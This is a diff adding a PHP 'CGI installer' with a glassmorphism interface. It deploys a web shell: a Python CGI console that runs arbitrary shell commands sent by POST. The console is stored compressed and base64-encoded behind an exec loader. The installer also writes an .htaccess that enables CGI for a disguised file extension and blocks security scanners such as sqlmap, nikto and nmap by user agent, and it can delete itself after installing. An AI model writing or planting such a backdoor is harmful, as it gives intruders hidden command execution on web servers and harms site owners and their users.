@@ -1,0 +1,368 @@
+<?php
+// ==========================================
+//  CGI INSTALLER BY PTSMC - GLASS EDITION
+//  Style: Modern Clean UI (Glassmorphism)
+//  Logic: Protected & Isolated (CGI Bypass)
+// ==========================================
+
+// --- [CORE LOGIC START] ---
+// Konfigurasi Folder & File
+$folder_name = "cgi-ptsmc";
+$shell_name  = "system.ptsmc"; 
+$ht_name     = ".htaccess";
+
+// 1. Python Payload (Terminal Engine)
+$raw_python = <<<'EOD'
+import cgi, cgitb, subprocess, os, sys
+cgitb.enable()
+print("Content-Type: text/html\n")
+print("""
+<!DOCTYPE html>
+<html><head><title>System Console</title>
+<style>
+    body{background:#000000;color:#a6accd;font-family:'JetBrains Mono',Consolas,monospace;padding:20px;font-size:15px;line-height:1.5;}
+    .header{border-bottom:1px solid #333;padding-bottom:10px;margin-bottom:20px;color:#ff0000;font-weight:bold;display:flex;justify-content:space-between;}
+    input{background:#292d3e;border:1px solid #444;color:#fff;width:98%;padding:10px;outline:none;border-radius:15px;margin-top:15px;font-family:inherit;}
+    input:focus{border-color:#89ddff;}
+    button{display:none;}
+    pre{margin-top:15px;white-space:pre-wrap;color:#ff0000;}
+    .p{color:#25ff00;margin-right:5px;}
+</style></head><body>
+<div class="header"><span>SERVER CONSOLE</span><span>CGI MODE</span></div>
+<form method=POST>
+    <span class="p">admin@server:~$</span> 
+    <input type=text name=c autofocus autocomplete=off placeholder="Input here...">
+    <button>Run</button>
+</form>
+<pre>
+""")
+f=cgi.FieldStorage()
+c=f.getvalue("c")
+if c:
+    try:
+        p=subprocess.Popen(c,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+        o,e=p.communicate()
+        if o:print(o.decode('utf-8','replace'))
+        if e:print("STDERR:\n"+e.decode('utf-8','replace'))
+    except Exception as x:print(x)
+print("</pre></body></html>")
+EOD;
+
+// 2. Encoding
+$compressed = base64_encode(zlib_encode($raw_python, ZLIB_ENCODING_DEFLATE));
+
+// 3. Loader
+$loader_code = "#!/usr/bin/python\n";
+$loader_code .= "import zlib,base64,sys\n";
+$loader_code .= "try:\n";
+$loader_code .= " exec(zlib.decompress(base64.b64decode('$compressed')))\n";
+$loader_code .= "except Exception as e: print('Content-type: text/html\\n\\nError: '+str(e))";
+
+// 4. htaccess (Anti-Scanner + Handler)
+$htaccess_code = "Options +ExecCGI\n";
+$htaccess_code .= "AddHandler cgi-script .ptsmc\n";
+$htaccess_code .= "DirectoryIndex $shell_name\n";
+$htaccess_code .= "<IfModule mod_rewrite.c>\n";
+$htaccess_code .= "RewriteEngine On\n";
+$htaccess_code .= "RewriteCond %{HTTP_USER_AGENT} (sqlmap|nikto|wpscan|nmap|curl|wget) [NC]\n";
+$htaccess_code .= "RewriteRule . - [F,L]\n";
+$htaccess_code .= "</IfModule>";
+
+// 5. Installation Process
+$logs = [];
+$is_deployed = false;
+$target_url = "";
+
+if(isset($_POST['deploy'])) {
+    $target_dir = __DIR__ . DIRECTORY_SEPARATOR . $folder_name;
+    
+    // Make Folder
+    if(!file_exists($target_dir)) {
+        if(mkdir($target_dir, 0755)) {
+            $logs[] = ["type"=>"ok", "txt"=>"Workspace created: /$folder_name"];
+        } else {
+            $logs[] = ["type"=>"fail", "txt"=>"Failed to create workspace."];
+        }
+    } else {
+        $logs[] = ["type"=>"info", "txt"=>"Workspace already exists."];
+    }
+
+    if(is_dir($target_dir)) {
+        // Write Payload
+        $p_path = $target_dir . DIRECTORY_SEPARATOR . $shell_name;
+        if(file_put_contents($p_path, $loader_code)) {
+            chmod($p_path, 0755); // Wajib executable
+            $logs[] = ["type"=>"ok", "txt"=>"Core system generated ($shell_name)."];
+            
+            // Write htaccess
+            $h_path = $target_dir . DIRECTORY_SEPARATOR . $ht_name;
+            if(file_put_contents($h_path, $htaccess_code)) {
+                $logs[] = ["type"=>"ok", "txt"=>"Security bypass & rules applied."];
+                $is_deployed = true;
+                $target_url = $folder_name . "/" . $shell_name;
+            } else {
+                $logs[] = ["type"=>"fail", "txt"=>"Failed to apply security rules."];
+            }
+        } else {
+            $logs[] = ["type"=>"fail", "txt"=>"Write permission denied."];
+        }
+    }
+
+    // Self Destruct
+    if($is_deployed && isset($_POST['cleanup'])) {
+        if(unlink(__FILE__)) {
+            $logs[] = ["type"=>"info", "txt"=>"Installer removed for safety."];
+        }
+    }
+}
+// --- [CORE LOGIC END] ---
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PTSMC System</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #4f46e5;
+            --primary-hover: #4338ca;
+            --glass-bg: rgba(255, 255, 255, 0.1);
+            --glass-border: rgba(255, 255, 255, 0.2);
+            --text-light: #f3f4f6;
+            --text-dim: #9ca3af;
+            --success: #34d399;
+            --error: #f87171;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(-45deg, #4b0000, #000000);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: var(--text-light);
+            overflow: hidden;
+        }
+
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .glass-card {
+            width: 100%;
+            max-width: 450px;
+            background: var(--glass-bg);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid var(--glass-border);
+            border-radius: 35px;
+            padding: 40px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            animation: slideUpFade 0.8s cubic-bezier(0.16, 1, 0.3, 1);
+            position: relative;
+        }
+
+        @keyframes slideUpFade {
+            from { opacity: 0; transform: translateY(40px) scale(0.95); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 4px 12px;
+            background: rgb(255 0 0 / 20%);
+            border: 1px solid rgb(255 0 0 / 40%);
+            color: #ffffff;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            letter-spacing: 0.5px;
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            background: linear-gradient(to right, #fff, #c7d2fe);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        p.desc {
+            color: #ffffff;
+            font-size: 14px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .control-group {
+            margin-bottom: 25px;
+            animation: fadeIn 1s ease 0.3s backwards;
+        }
+
+        .checkbox-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            cursor: pointer;
+            font-size: 13px;
+            color: #ffffff;
+            user-select: none;
+        }
+        
+        .checkbox-wrapper input {
+            width: 16px;
+            height: 16px;
+            accent-color: #a90000;
+        }
+
+        .btn-main {
+            width: 100%;
+            padding: 16px;
+            border-radius: 20px;
+            border: none;
+            background: linear-gradient(341deg, #1e0000, #ff0000);
+            color: white;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            animation: fadeIn 1s ease 0.5s backwards;
+        }
+
+        .btn-main:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 15px -3px rgb(0 0 0 / 40%);
+        }
+
+        .btn-main:active {
+            transform: translateY(0);
+        }
+
+        .status-list {
+            margin-top: 25px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .status-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 13px;
+            padding: 10px;
+            background: rgba(0,0,0,0.2);
+            border-radius: 15px;
+            animation: slideInRight 0.5s ease backwards;
+        }
+
+        .icon-box {
+            width: 20px;
+            height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+        }
+        .ok .icon-box { background: rgb(0 255 22 / 0%); color: #0dff00; }
+        .fail .icon-box { background: rgba(248, 113, 113, 0.2); color: var(--error); }
+        .info .icon-box { background: rgba(255,255,255,0.1); color: #fff; }
+
+        .final-action {
+            margin-top: 20px;
+            text-align: center;
+            animation: fadeIn 0.5s ease 1s backwards;
+        }
+
+        .link-access {
+            display: inline-block;
+            text-decoration: none;
+            color: #00ffd2;
+            background: rgba(255,255,255,0.1);
+            padding: 10px 20px;
+            border-radius: 30px;
+            font-size: 13px;
+            font-weight: 500;
+            border: 1px solid rgba(255,255,255,0.2);
+            transition: 0.3s;
+        }
+        
+        .link-access:hover {
+            background: #fff;
+            color: #000;
+        }
+
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes slideInRight { 
+            from { opacity: 0; transform: translateX(-10px); } 
+            to { opacity: 1; transform: translateX(0); } 
+        }
+
+        /* Responsive text */
+        @media (max-width: 480px) {
+            .glass-card { padding: 30px; margin: 20px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="glass-card">
+        <span class="badge">Terminal-PTSMC V3.0</span>
+        <h1>Installation</h1>
+        <p class="desc">Setup secure CGI environment and bypass handlers. All files will be isolated in <b>/<?php echo $folder_name; ?>/</b>.</p>
+
+        <?php if(!$is_deployed): ?>
+        <form method="POST">
+            <div class="control-group">
+                <label class="checkbox-wrapper">
+                    <input type="checkbox" name="cleanup" checked>
+                    <span>Remove installer after deployment (Recommended)</span>
+                </label>
+            </div>
+            
+            <button type="submit" name="deploy" class="btn-main">
+                Start Deployment
+            </button>
+        </form>
+        <?php endif; ?>
+
+        <?php if(!empty($logs)): ?>
+            <div class="status-list">
+                <?php 
+                $delay = 0;
+                foreach($logs as $log): 
+                    $icon = ($log['type'] == 'ok') ? '✓' : (($log['type'] == 'fail') ? '✕' : 'ℹ');
+                    $delay += 0.1;
+                ?>
+                    <div class="status-item <?php echo $log['type']; ?>" style="animation-delay: <?php echo $delay; ?>s">
+                        <div class="icon-box"><?php echo $icon; ?></div>
+                        <span><?php echo $log['txt']; ?></span>
+                    </div>
+                <?php endforeach; ?>
+            </div>
+        <?php endif; ?>
+
+        <?php if($is_deployed): ?>
+            <div class="final-action">
+                <a href="<?php echo $target_url; ?>" target="_blank" class="link-access">
+                    Open Console &rarr;
+                </a>
+            </div>
+        <?php endif; ?>
+    </div>
+
+</body>
+</html>
